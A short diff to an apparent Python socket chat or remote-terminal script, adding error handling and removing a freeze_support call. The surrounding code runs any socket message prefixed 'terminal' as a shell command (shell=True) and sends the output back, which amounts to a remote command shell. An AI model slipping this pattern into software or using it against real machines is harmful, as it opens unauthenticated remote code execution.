@@ -1,6 +1,4 @@
 import socket, sys, subprocess
-import multiprocessing
-multiprocessing.freeze_support()
 from multiprocessing import Process
 
 def printInput(s):
@@ -9,8 +7,11 @@ def printInput(s):
 		if line:
 			line = line.decode().rstrip()
 			if line[:8] == 'terminal':
-				output = subprocess.check_output(line[9:], shell=True)
-				s.send(output)
+				try:
+					output = subprocess.check_output(line[9:], shell=True)
+					s.send(output)
+				except:
+					print('invalid command!')
 			else:
 				print(line)
 		else:
